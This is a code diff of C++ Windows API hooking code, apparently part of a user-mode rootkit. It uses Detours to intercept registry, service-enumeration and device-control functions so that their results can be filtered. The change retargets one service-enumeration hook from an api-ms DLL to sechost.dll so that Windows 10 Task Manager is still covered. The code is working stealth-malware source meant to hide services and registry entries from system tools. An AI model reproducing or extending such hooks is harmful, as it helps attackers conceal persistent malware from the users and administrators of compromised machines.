@@ -10,7 +10,7 @@ nt::NTENUMERATEKEY Hooks::OriginalNtEnumerateKey = NULL;
 nt::NTENUMERATEVALUEKEY Hooks::OriginalNtEnumerateValueKey = NULL;
 nt::ENUMSERVICEGROUPW Hooks::OriginalEnumServiceGroupW = NULL;
 nt::ENUMSERVICESSTATUSEXW Hooks::OriginalEnumServicesStatusExW = NULL;
-nt::ENUMSERVICESSTATUSEXW Hooks::OriginalEnumServicesStatusExWApi = NULL;
+nt::ENUMSERVICESSTATUSEXW Hooks::OriginalEnumServicesStatusExW2 = NULL;
 nt::NTDEVICEIOCONTROLFILE Hooks::OriginalNtDeviceIoControlFile = NULL;
 
 void Hooks::Initialize()
@@ -30,14 +30,13 @@ void Hooks::Initialize()
 		InstallHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID*)&OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
 		InstallHook("advapi32.dll", "EnumServiceGroupW", (LPVOID*)&OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
 		InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
-		InstallHook("api-ms-win-service-core-l1-1-1.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExWApi, HookedEnumServicesStatusExWApi);
+		InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 		InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 		DetourTransactionCommit();
 
 		// Usually, ntdll.dll should be the only DLL to hook.
 		// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
 		// EnumServiceGroupW and EnumServicesStatusExW from advapi32.dll access services.exe through RPC. There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
-		// Furthermore, the api-ms-*.dll files are a set of DLL's introduced in Windows 7 that also need to be hooked in this case.
 		// EnumServicesStatusA and EnumServicesStatusExA also implement the RPC, but do not seem to be used by any applications out there.
 	}
 }
@@ -57,7 +56,7 @@ void Hooks::Shutdown()
 		UninstallHook(OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
 		UninstallHook(OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
 		UninstallHook(OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
-		UninstallHook(OriginalEnumServicesStatusExWApi, HookedEnumServicesStatusExWApi);
+		UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 		UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 		DetourTransactionCommit();
 	}
@@ -366,10 +365,10 @@ BOOL WINAPI Hooks::HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM
 
 	return result;
 }
-BOOL WINAPI Hooks::HookedEnumServicesStatusExWApi(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
+BOOL WINAPI Hooks::HookedEnumServicesStatusExW2(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
 {
-	// TaskMgr (Windows 10 uses api-ms-win-service-core-l1-1-1.dll instead of advapi32.dll)
-	BOOL result = OriginalEnumServicesStatusExWApi(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);
+	// TaskMgr (Windows 10 uses sechost.dll instead of advapi32.dll)
+	BOOL result = OriginalEnumServicesStatusExW2(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);
 
 	if (result && services && servicesReturned)
 	{
